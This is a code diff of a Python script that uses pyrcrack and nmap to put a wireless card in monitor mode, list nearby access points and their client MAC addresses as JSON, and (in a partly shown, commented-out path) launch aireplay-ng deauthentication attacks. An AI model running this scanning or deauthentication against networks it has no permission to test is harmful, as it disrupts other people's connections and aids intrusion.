@@ -2,9 +2,16 @@ import pyrcrack
 import nmap
 import sys
 import asyncio
+import json
+from flask import Flask 
 from async_timeout import timeout
 from contextlib import suppress
 
+app = Flask(__name__)
+
+@app.route("/")
+def index():
+    return "Index"
 
 
 def runNmap(ip):
@@ -33,30 +40,31 @@ async def attack(interface, apo):
                 interface['interface'], deauth=sys.argv[1], D=True)
             print(await aireplay.proc.communicate())
 
-
-async def deauth():
+async def getAps():
     """Scan for targets, return json."""
     async with pyrcrack.AirmonNg() as airmon:
         interface = (await airmon.list_wifis())[0]['interface']
         interface = (await airmon.set_monitor(interface))[0]
-        print(interface)
         async with pyrcrack.AirodumpNg() as pdump:
             await pdump.run(interface['interface'], write_interval=1)
-            #print(pdump.get_results())
-            while True:
-                await asyncio.sleep(3)
-                print(pdump.sorted_aps()[0])
-                print()
-               # for apo in pdump.sorted_aps():
-                   # print(apo.clients)
-
-        #             await attack(interface, apo)
+            await asyncio.sleep(20)
+            aps = pdump.sorted_aps()
+            apsList = []
+            for ap in aps:
+                currentDict = {"bssid": ap.bssid, "essid": ap.essid,"channel": ap.channel, "clients": [c.station_mac for c in ap.clients]}
+                apsList.append(currentDict)
+        #       await attack(interface, apo)
+            print(json.dumps(apsList))
+            return json.dumps(apsList)
 
 
 async def printing():
     async with pyrcrack.AirmonZc() as airmon:
         print(await airmon.list_wifis())
 
+#if __name__ == "__main__":
+#    app.run(debug=True)
+
 # runNmap('10.202.208.1-30')
-asyncio.run(deauth())
+asyncio.run(getAps())
 # asyncio.run(printing())
